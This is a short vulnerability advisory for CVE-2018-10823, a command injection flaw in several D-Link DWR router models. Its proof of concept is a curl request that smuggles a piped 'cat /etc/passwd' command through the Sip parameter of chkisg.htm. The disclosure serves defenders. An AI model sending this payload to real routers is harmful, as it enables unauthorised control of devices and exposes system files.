## Shell command injection
CVE: CVE-2018-10823

CVSS v3: 9.1
AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

Description: An issue was discovered on D-Link routers:

DWR-116 through 1.06,
DWR-512 through 2.02,
DWR-712 through 2.02,
DWR-912 through 2.02,
DWR-921 through 2.02,
DWR-111 through 1.01,
and probably others with the same type of firmware.
An authenticated attacker may execute arbitrary code by injecting the shell command into the chkisg.htm page Sip parameter. This allows for full control over the device internals.

PoC:

Login to the router.
Request the following URL after login:
`$ curl http://routerip/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20cat%20%2Fetc%2Fpasswd`
See the passwd file contents in the response.